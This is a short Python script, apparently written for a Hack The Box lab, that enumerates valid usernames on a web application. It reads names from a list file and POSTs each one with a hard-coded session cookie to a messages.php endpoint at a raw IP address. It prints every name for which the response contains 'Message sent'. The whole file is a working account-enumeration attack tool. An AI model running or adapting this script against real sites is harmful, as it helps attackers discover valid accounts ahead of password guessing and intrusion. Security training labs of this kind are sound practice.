import requests
import time

# file that contain user:pass
user_file = "list.txt"

# create url using user and password as argument
url = "http://178.128.171.82:31442/messages.php"
cookies = {'htb_sessid': 'YTAzMTRmNWU1Mjg5ZWYzYjNlZTY5Y2U1NmFjNGZkOWM%3D'}

# read user file 
with open(user_file, "r") as fh:
    for fline in fh:
        # skip comment
        if fline.startswith("#"):
            continue

        username = fline.rstrip()
        message = "a"
        submit = "submit"

        # prepare POST data
        data = {
            "user": username,
            "message": message,
            "submit": submit
        }
        
        # do the request
        res = requests.post(url, data=data, cookies=cookies)

        # print only valid usernames
        if "Message sent" in res.text:
            print("[+] Valid username: user:{}".format(username))
 